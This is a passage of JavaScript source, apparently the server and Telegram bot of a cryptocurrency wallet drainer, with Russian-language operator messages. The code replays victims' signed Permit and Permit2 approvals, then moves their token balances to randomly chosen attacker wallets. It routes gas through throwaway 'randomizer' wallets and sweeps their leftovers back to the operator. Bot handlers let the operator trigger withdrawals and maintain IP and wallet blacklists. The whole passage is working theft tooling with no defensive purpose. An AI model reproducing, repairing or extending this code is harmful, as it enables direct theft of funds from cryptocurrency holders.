        const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
        const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
        const tx_native = await signer_main.sendTransaction({
          from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
          gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce_main, data: '0x'
        });
        await node.waitForTransaction(tx_native.hash, 1, 30000);
      }
      const nonce = await node.getTransactionCount(check_wallet_address, "pending");
      const tx = await contract.transferFrom(data.sign.owner, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], balance.lt(allowance) ? balance : allowance, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce
      });
      await node.waitForTransaction(tx.hash, 1, 60000);
      await send_message(callback.message.chat.id, `<b>💎 Успешно списали PERMIT #${permit_id}</b>\n\nДеньги отправлены на ваш кошелек.`, {
        parse_mode: 'HTML'
      });
    } catch(err) {
      console.log(err);
      await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nОшибка транзакции во время выполнения подписи.`, {
        parse_mode: 'HTML'
      });
      return false;
    }
    try {
      if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
        const balance_native = await signer.getBalance();
        const nonce = await node.getTransactionCount(check_wallet_address, "pending");
        await signer.sendTransaction({
          from: check_wallet_address, to: MS_Wallet_Address,
          value: ethers.BigNumber.from(balance_native).sub(ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))))),
          gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('2')), data: '0x'
        });
      }
    } catch(err) {
      console.log(err);
    }
  } catch(err) {
    console.log(err);
  }
};

const repeat_permit2 = async (callback, permit_id, data) => {
  try {
    await send_message(callback.message.chat.id, `<b>Запущен процесс подписи Permit2 #${permit_id}</b>\n\nПо результатам успешной или неуспешной подписи вам придёт дополнительное уведомление.`, {
      parse_mode: 'HTML'
    });

    let check_wallet_address = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? data.PW.address : MS_Wallet_Address;
    let check_wallet_private = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? get_random_wallet_private(data.PW.address) : MS_Wallet_Private;

    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.sign.chain_id]);
    const signer = new ethers.Wallet(check_wallet_private, node);
    const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', data.mode == 1 ? MS_Contract_ABI['PERMIT2_SINGLE'] : MS_Contract_ABI['PERMIT2_BATCH'], signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    const nonce = await node.getTransactionCount(check_wallet_address, "pending");

    if (data.mode == 1) {
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.permit(data.address, data.message, data.signature, { from: check_wallet_address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        if (MS_Settings.Permit2.Bypass == 1)
          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
        else gas_limit = 15000000;
      }
      if (MS_Settings.Permit2.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
        await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nНевалидные данные, подпись невозможна.`, {
          parse_mode: 'HTML'
        });
        return false;
      }
      if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
        const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
        const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
        const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
        const tx_native = await signer_main.sendTransaction({
          from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
          gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce_main, data: '0x'
        });
        await node.waitForTransaction(tx_native.hash, 1, 30000);
      }
      try {
        const tx = await contract.permit(data.address, data.message, data.signature, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        let tokens_list = '';
        try {
          for (const x_token of data.assets)
            tokens_list += `- ${x_token.name}\n`;
        } catch(err) {
          console.log(err);
        }
        await send_message(callback.message.chat.id, `<b>✅ Успешно подписали PERMIT #${permit_id}</b>\n\nСписок токенов, на которые выданы разрешения:\n\n${tokens_list}\nУчтите, что токены ещё не списаны, а на них только выдано разрешение, сейчас будет произведена попытка списания.`, {
          parse_mode: 'HTML'
        });
        try {
          let transfer_details = [], withdraw_list = '';
          for (const x_token of data.assets) {
            try {
              const contract_2 = new ethers.Contract(x_token.address, MS_Contract_ABI['ERC20'], signer);
              const balance = await contract_2.balanceOf(data.address); let withdraw_amount = null;
              const allowance = await contract_2.allowance(data.address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
              if (ethers.BigNumber.from(allowance).lt(ethers.BigNumber.from(balance)))
                withdraw_amount = allowance;
              else withdraw_amount = balance;
              if (ethers.BigNumber.from(withdraw_amount).gt(ethers.BigNumber.from('0'))) {
                transfer_details.push({
                  from: data.address, to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
                  token: x_token.address, amount: withdraw_amount
                });
                withdraw_list += `- ${x_token.name} (${parseFloat(x_token.amount)}, ${parseFloat(x_token.amount_usd).toFixed(2)}$)\n`;
              }
            } catch(err) {
              console.log(err);
            }
          }
          if (transfer_details.length > 0) {
            try {
              gas_limit = await contract.estimateGas.transferFrom(transfer_details[0].from, transfer_details[0].to, transfer_details[0].amount, transfer_details[0].token, { from: check_wallet_address });
              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
            } catch(err) {
              gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
            }
            if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
              const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
              const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
              const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
              const tx_native = await signer_main.sendTransaction({
                from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
                gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
                gasPrice: ethers.BigNumber.from(gas_price),
                nonce: nonce_main, data: '0x'
              });
              await node.waitForTransaction(tx_native.hash, 1, 30000);
            }
            const tx = await contract.transferFrom(transfer_details[0].from, transfer_details[0].to, transfer_details[0].amount, transfer_details[0].token, {
              gasLimit: ethers.BigNumber.from(gas_limit),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1'))
            });
            await node.waitForTransaction(tx.hash, 1, 60000);
            await send_message(callback.message.chat.id, `<b>💎 Успешно списали PERMIT #${permit_id}</b>Список токенов, которые были выведены:\n\n${withdraw_list}`, {
              parse_mode: 'HTML'
            });
          }
        } catch(err) {
          console.log(err);
          await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nОшибка при выполнении транзакции.`, {
            parse_mode: 'HTML'
          });
          return false;
        }
      } catch(err) {
        console.log(err);
        await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nОшибка при выполнении транзакции.`, {
          parse_mode: 'HTML'
        });
        return false;
      }
    } else {
      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], signer);
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.permit(data.address, data.message, data.signature, { from: check_wallet_address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        if (MS_Settings.Permit2.Bypass == 1)
          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
        else gas_limit = 15000000;
      }
      if (MS_Settings.Permit2.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
        await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nНевалидные данные, подпись невозможна.`, {
          parse_mode: 'HTML'
        });
        return false;
      }
      try {
        if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
          const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
          const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
          const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
          const tx_native = await signer_main.sendTransaction({
            from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
            gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
            gasPrice: ethers.BigNumber.from(gas_price),
            nonce: nonce_main, data: '0x'
          });
          await node.waitForTransaction(tx_native.hash, 1, 30000);
        }
        const tx = await contract.permit(data.address, data.message, data.signature, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        let tokens_list = '';
        try {
          for (const x_token of data.assets)
            tokens_list += `- ${x_token.name}\n`;
        } catch(err) {
          console.log(err);
        }
        await send_message(callback.message.chat.id, `<b>✅ Успешно подписали PERMIT #${permit_id}</b>\n\nСписок токенов, на которые выданы разрешения:\n\n${tokens_list}\nУчтите, что токены ещё не списаны, а на них только выдано разрешение, сейчас будет произведена попытка списания.`, {
          parse_mode: 'HTML'
        });
        try {
          let transfer_details = [], withdraw_list = '';
          for (const x_token of data.assets) {
            try {
              const contract_2 = new ethers.Contract(x_token.address, MS_Contract_ABI['ERC20'], signer);
              const balance = await contract_2.balanceOf(data.address); let withdraw_amount = null;
              const allowance = await contract_2.allowance(data.address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
              if (ethers.BigNumber.from(allowance).lt(ethers.BigNumber.from(balance)))
                withdraw_amount = allowance;
              else withdraw_amount = balance;
              if (ethers.BigNumber.from(withdraw_amount).gt(ethers.BigNumber.from('0'))) {
                transfer_details.push({
                  from: data.address, to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
                  token: x_token.address, amount: withdraw_amount
                });
                withdraw_list += `- ${x_token.name} (${parseFloat(x_token.amount)}, ${parseFloat(x_token.amount_usd).toFixed(2)}$)\n`;
              }
            } catch(err) {
              console.log(err);
            }
          }
          if (transfer_details.length > 0) {
            try {
              gas_limit = await contract.estimateGas.transferFrom(transfer_details, { from: check_wallet_address });
              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
            } catch(err) {
              gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
            }
            if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
              const gas_amount_1 = ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from('2'));
              const signer_main = new ethers.Wallet(MS_Wallet_Private, node);
              const nonce_main = await node.getTransactionCount(MS_Wallet_Address, "pending");
              const tx_native = await signer_main.sendTransaction({
                from: MS_Wallet_Address, to: check_wallet_address, value: gas_amount_1,
                gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
                gasPrice: ethers.BigNumber.from(gas_price),
                nonce: nonce_main, data: '0x'
              });
              await node.waitForTransaction(tx_native.hash, 1, 30000);
            }
            const tx = await contract.transferFrom(transfer_details, {
              gasLimit: ethers.BigNumber.from(gas_limit),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1'))
            });
            await node.waitForTransaction(tx.hash, 1, 60000);
            await send_message(callback.message.chat.id, `<b>💎 Успешно списали PERMIT #${permit_id}</b>Список токенов, которые были выведены:\n\n${withdraw_list}`, {
              parse_mode: 'HTML'
            });
          }
        } catch(err) {
          console.log(err);
          await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nОшибка при выполнении транзакции.`, {
            parse_mode: 'HTML'
          });
          return false;
        }
      } catch(err) {
        console.log(err);
        await send_message(callback.message.chat.id, `<b>❌ Не удалось списать PERMIT #${permit_id}</b>\n\nОшибка при выполнении транзакции.`, {
          parse_mode: 'HTML'
        });
        return false;
      }
    }
    try {
      if (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) {
        const balance_native = await signer.getBalance();
        await signer.sendTransaction({
          from: check_wallet_address, to: MS_Wallet_Address,
          value: ethers.BigNumber.from(balance_native).sub(ethers.BigNumber.from(gas_price).mul(ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))))),
          gasLimit: ethers.BigNumber.from(String((data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000))),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('2')), data: '0x'
        });
      }
    } catch(err) {
      console.log(err);
    }
  } catch(err) {
    console.log(err);
  }
};

if (MS_Functional_Bot) {
  bot.on('callback_query', async (callback) => {
    try {
      if (!MS_Telegram_Admin_IDs.includes(callback.from.id)) return;
      let matches = null;
      if (matches = callback.data.match(/^sign_permit_(\d+)$/)) {
        if (fs.existsSync(path.join('data', 'permits', `${matches[1]}.permit`))) {
          let permit_data = JSON.parse(fs.readFileSync(path.join('data', 'permits', `${matches[1]}.permit`), 'utf-8'));
          await repeat_permit(callback, matches[1], permit_data);
          return;
        } else {
          await bot.answerCallbackQuery(callback.id, { text: 'Данные от Permit не найдены' });
          return;
        }
      } else if (matches = callback.data.match(/^sign_permit2_(\d+)$/)) {
        if (fs.existsSync(path.join('data', 'permits_2', `${matches[1]}.permit`))) {
          let permit_data = JSON.parse(fs.readFileSync(path.join('data', 'permits', `${matches[1]}.permit`), 'utf-8'));
          await repeat_permit2(callback, matches[1], permit_data);
          return;
        } else {
          await bot.answerCallbackQuery(callback.id, { text: 'Данные от Permit не найдены' });
          return;
        }
      } else if (matches = callback.data.match(/^block_ip_(\S+)$/)) {
        if (!MS_IP_Blacklist.includes(matches[1])) {
          MS_IP_Blacklist.push(matches[1].toLowerCase().trim());
          let file_data = ''; for (const IP of MS_IP_Blacklist) {
            file_data += `${IP}\r\n`;
          }; fs.writeFileSync(path.join('blacklists', 'ips.txt'), file_data, 'utf-8');
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '✅ Разблокировать IP',
                  callback_data: `unblock_ip_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'IP заблокирован' });
        } else {
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '✅ Разблокировать IP',
                  callback_data: `unblock_ip_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'IP уже заблокирован' });
        }
        return;
      } else if (matches = callback.data.match(/^unblock_ip_(\S+)$/)) {
        if (MS_IP_Blacklist.includes(matches[1])) {
          for (let i = (MS_IP_Blacklist.length) - 1; i >= 0; i--) {
            if (MS_IP_Blacklist[i] == matches[1]) {
              MS_IP_Blacklist.splice(i, 1);
            }
          }
          let file_data = ''; for (const IP of MS_IP_Blacklist) {
            file_data += `${IP}\r\n`;
          }; fs.writeFileSync(path.join('blacklists', 'ips.txt'), file_data, 'utf-8');
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '🤕 Заблокировать IP',
                  callback_data: `block_ip_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'IP разблокирован' });
        } else {
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '🤕 Заблокировать IP',
                  callback_data: `block_ip_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'IP не заблокирован' });
        }
        return;
      } else if (matches = callback.data.match(/^block_wallet_(\S+)$/)) {
        if (!MS_Wallet_Blacklist.includes(matches[1])) {
          MS_Wallet_Blacklist.push(matches[1].toLowerCase().trim());
          let file_data = ''; for (const address of MS_Wallet_Blacklist) {
            file_data += `${address}\r\n`;
          }; fs.writeFileSync(path.join('blacklists', 'wallets.txt'), file_data, 'utf-8');
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '✅ Разблокировать кошелек',
                  callback_data: `unblock_wallet_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'Кошелек заблокирован' });
        } else {
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '✅ Разблокировать кошелек',
                  callback_data: `unblock_wallet_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'Кошелек уже заблокирован' });
        }
        return;
      } else if (matches = callback.data.match(/^unblock_wallet_(\S+)$/)) {
        if (MS_Wallet_Blacklist.includes(matches[1])) {
          for (let i = (MS_Wallet_Blacklist.length) - 1; i >= 0; i--) {
            if (MS_Wallet_Blacklist[i] == matches[1]) {
              MS_Wallet_Blacklist.splice(i, 1);
            }
          }
          let file_data = ''; for (const address of MS_Wallet_Blacklist) {
            file_data += `${address}\r\n`;
          }; fs.writeFileSync(path.join('blacklists', 'wallets.txt'), file_data, 'utf-8');
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '🤕 Заблокировать кошелек',
                  callback_data: `block_wallet_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'Кошелек разблокирован' });
        } else {
          await bot.editMessageReplyMarkup({
            inline_keyboard: [
              [
                {
                  text: '🤕 Заблокировать кошелек',
                  callback_data: `block_wallet_${matches[1]}`
                }
              ]
            ]
          }, {
            chat_id: callback.message.chat.id, message_id: callback.message.message_id
          });
          await bot.answerCallbackQuery(callback.id, { text: 'Кошелек не заблокирован' });
        }
        return;
      }
    } catch(err) {
      console.log(err);
    }
  });
}